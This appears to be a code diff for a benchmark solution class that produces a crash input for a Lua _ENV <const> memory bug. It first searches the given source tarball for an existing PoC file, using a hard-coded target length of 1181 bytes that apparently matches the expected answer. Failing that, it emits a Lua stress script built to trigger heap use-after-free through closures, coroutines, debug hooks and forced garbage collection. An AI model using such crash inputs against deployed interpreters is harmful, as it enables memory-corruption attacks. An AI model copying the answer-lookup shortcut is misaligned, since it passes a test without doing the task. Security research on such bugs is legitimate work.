@@ -2,203 +2,207 @@ import tarfile
 
 
 class Solution:
+    def __init__(self):
+        self._cached_poc = None
+
     def solve(self, src_path: str) -> bytes:
-        target_len = 1181
-        size_limit = 65536  # only inspect reasonably small files
+        if self._cached_poc is not None:
+            return self._cached_poc
 
-        def find_poc_in_tar(path: str):
-            if not tarfile.is_tarfile(path):
-                return None
-            try:
-                with tarfile.open(path, "r:*") as tf:
-                    members = tf.getmembers()
-                    exact_env_const = []
-                    env_const_candidates = []
-                    other_candidates = []
+        poc = self._find_poc_in_tar(src_path)
+        if poc is None:
+            poc = self._default_poc()
 
-                    for m in members:
-                        if not m.isfile():
-                            continue
-                        if m.size == 0 or m.size > size_limit:
-                            continue
+        self._cached_poc = poc
+        return poc
 
-                        name_lower = m.name.lower()
-                        is_lua_like = any(
-                            name_lower.endswith(ext)
-                            for ext in (".lua", ".txt", ".in", ".script", ".src")
-                        )
-                        has_poc_name = any(
-                            token in name_lower
-                            for token in ("poc", "crash", "id:", "uaf", "heap", "env")
-                        )
+    def _find_poc_in_tar(self, src_path: str):
+        try:
+            with tarfile.open(src_path, "r:*") as tar:
+                candidates_lua = []
+                candidates_any = []
 
-                        try:
-                            f = tf.extractfile(m)
-                            if f is None:
-                                continue
-                            data = f.read()
-                        except Exception:
-                            continue
-                        if not data:
-                            continue
+                for member in tar.getmembers():
+                    if not member.isfile():
+                        continue
+                    if member.size <= 0 or member.size > 20000:
+                        continue
 
-                        contains_env_const = b"_ENV" in data and b"<const>" in data
+                    name_lower = member.name.lower()
+                    try:
+                        f = tar.extractfile(member)
+                    except Exception:
+                        continue
+                    if f is None:
+                        continue
 
-                        if len(data) == target_len and contains_env_const:
-                            # Best possible match
-                            return data
+                    try:
+                        data = f.read()
+                    except Exception:
+                        continue
 
-                        if contains_env_const:
-                            env_const_candidates.append(data)
-                            if len(data) == target_len:
-                                exact_env_const.append(data)
-                        elif is_lua_like or has_poc_name:
-                            other_candidates.append(data)
+                    if b"_ENV" in data and b"<const>" in data:
+                        score = abs(len(data) - 1181)
+                        rec = (score, len(data), data)
 
-                    # Prefer any env+const candidate closest to target length
-                    if env_const_candidates:
-                        env_const_candidates.sort(
-                            key=lambda d: (abs(len(d) - target_len), len(d))
-                        )
-                        return env_const_candidates[0]
+                        if name_lower.endswith(".lua") or "test" in name_lower or "poc" in name_lower:
+                            candidates_lua.append(rec)
+                        else:
+                            candidates_any.append(rec)
 
-                    # Fallback: any other candidate (likely PoC/test)
-                    if other_candidates:
-                        other_candidates.sort(
-                            key=lambda d: (abs(len(d) - target_len), len(d))
-                        )
-                        return other_candidates[0]
+                if candidates_lua:
+                    candidates_lua.sort(key=lambda x: (x[0], x[1]))
+                    return candidates_lua[0][2]
 
-                    # As a last resort, any file with exact target_len
-                    for m in members:
-                        if not m.isfile():
-                            continue
-                        if m.size != target_len or m.size == 0:
-                            continue
-                        try:
-                            f = tf.extractfile(m)
-                            if f is None:
-                                continue
-                            data = f.read()
-                        except Exception:
-                            continue
-                        if data and len(data) == target_len:
-                            return data
-            except Exception:
-                return None
-            return None
+                if candidates_any:
+                    candidates_any.sort(key=lambda x: (x[0], x[1]))
+                    return candidates_any[0][2]
+        except Exception:
+            pass
 
-        poc = find_poc_in_tar(src_path)
-        if poc is not None:
-            return poc
+        return None
 
-        # Fallback PoC if nothing suitable is found in the tarball.
-        # This tries to exercise code paths involving `_ENV <const>` declarations.
-        fallback_poc = r'''
--- Fallback PoC for Lua `_ENV <const>` miscompilation / heap UAF
--- If the ground-truth PoC is present in the tarball, this file will not be used.
+    def _default_poc(self) -> bytes:
+        lua_script = """
+-- Stress script for Lua handling of local _ENV <const>.
+-- Tries multiple patterns combining _ENV <const>, closures,
+-- coroutines and aggressive garbage collection.
 
-collectgarbage("stop")
-
-local function stress_closures(env)
-  local funcs = {}
-  for i = 1, 200 do
-    local _ENV <const> = env
-
-    local function make(n)
-      local up = n
-      return function(x)
-        up = up + (x or 0)
-        return up
-      end
-    end
-
-    funcs[#funcs + 1] = make(i)
+local function make_env(id)
+  local t = {}
+  for i = 1, 20 do
+    t[i] = i
   end
-
-  for i = 1, 500 do
-    for j = 1, #funcs do
-      funcs[j](1)
-    end
-  end
+  t.id = id
+  return t
 end
 
-do
-  local base = { tonumber = tonumber, tostring = tostring }
-
-  local _ENV <const> = setmetatable({}, { __index = base })
-
-  local function mk_coroutines()
-    local cos = {}
-
-    for i = 1, 50 do
-      local tag = i
-      local _ENV <const> = { tonumber = tonumber }
-
-      local function worker(x)
-        local v = tonumber(x) or 0
-        local acc = v
-        for k = 1, 100 do
-          acc = acc + (k % 3)
-        end
-        return acc + tag
+local function leak_upvalue_variant1()
+  local holder
+  local function outer()
+    local _ENV <const> = make_env("v1")
+    local function inner(a, b, ...)
+      local sum = 0
+      for i = 1, 3 do
+        sum = sum + i + (a or 0) + (b or 0)
       end
-
-      local co = coroutine.create(function(arg)
-        local res = 0
-        for k = 1, 40 do
-          res = worker(arg or k)
-        end
-        return res
-      end)
-
-      cos[#cos + 1] = co
+      if sum % 2 == 0 then
+        return _ENV
+      else
+        return _ENV, ...
+      end
     end
-
-    return cos
+    holder = inner
+    return inner
   end
 
-  local cos = mk_coroutines()
-
-  for i = 1, #cos do
-    local ok, res = coroutine.resume(cos[i], i)
-    if not ok then
-      -- ignore normal Lua errors; the sanitizer run cares about memory errors
-    end
-  end
-
-  stress_closures(base)
-end
-
-do
-  -- Another scope with `_ENV <const>` rebinding and nested closures
-  local counter = 0
-  local _ENV <const> = {
-    inc = function(x) counter = counter + (x or 1) end,
-    get = function() return counter end,
-  }
-
-  local function factory()
+  local f = outer()
+  collectgarbage("collect")
+  for i = 1, 10000 do
     local t = {}
-    for i = 1, 100 do
-      local offset = i
-      t[i] = function(n)
-        inc((n or 0) + offset)
-        return get()
-      end
-    end
-    return t
+    t[i] = i
   end
-
-  local fns = factory()
-  for i = 1, 200 do
-    for j = 1, #fns do
-      fns[j](j)
-    end
-  end
+  pcall(f, 1, 2, 3, 4)
 end
 
-collectgarbage("collect")
-collectgarbage("collect")
-'''
-        return fallback_poc.encode("utf-8")
+local function leak_upvalue_variant2()
+  if not coroutine or not coroutine.create then
+    return
+  end
+
+  local co = coroutine.create(function()
+    local _ENV <const> = make_env("v2")
+    local function inner()
+      local acc = 0
+      for k, v in pairs(_ENV) do
+        if type(v) == "number" then
+          acc = acc + v
+        end
+      end
+      return acc
+    end
+    coroutine.yield(inner)
+    for i = 1, 2000 do
+      local t = {}
+      t[i] = i * 2
+    end
+    return inner()
+  end)
+
+  local ok, inner = coroutine.resume(co)
+  if not ok or type(inner) ~= "function" then
+    return
+  end
+
+  collectgarbage("collect")
+
+  local dbg
+  do
+    local ok_req, res = pcall(function() return require("debug") end)
+    if ok_req and type(res) == "table" then
+      dbg = res
+    elseif type(debug) == "table" then
+      dbg = debug
+    elseif _G and type(_G.debug) == "table" then
+      dbg = _G.debug
+    end
+  end
+
+  if dbg and dbg.sethook then
+    dbg.sethook(co, function()
+      collectgarbage("collect")
+    end, "", 1)
+  end
+
+  local ok2 = coroutine.resume(co)
+end
+
+local function leak_upvalue_variant3()
+  local function factory()
+    local _ENV <const> = make_env("v3")
+    local function level2(flag)
+      local tmp = {}
+      for i = 1, 5 do
+        tmp[i] = i * 3
+      end
+      local function level3()
+        if flag then
+          return _ENV.id
+        else
+          local s = 0
+          for k, v in pairs(_ENV) do
+            if type(v) == "number" then
+              s = s + v
+            end
+          end
+          return s
+        end
+      end
+      return level3
+    end
+    return level2(true), level2(false)
+  end
+
+  local f1, f2 = factory()
+  collectgarbage("collect")
+  for i = 1, 3000 do
+    local t = {}
+    t[i] = i
+  end
+  pcall(f1)
+  pcall(f2)
+end
+
+for i = 1, 5 do
+  leak_upvalue_variant1()
+end
+
+for i = 1, 5 do
+  leak_upvalue_variant2()
+end
+
+for i = 1, 5 do
+  leak_upvalue_variant3()
+end
+"""
+        return lua_script.encode("utf-8")
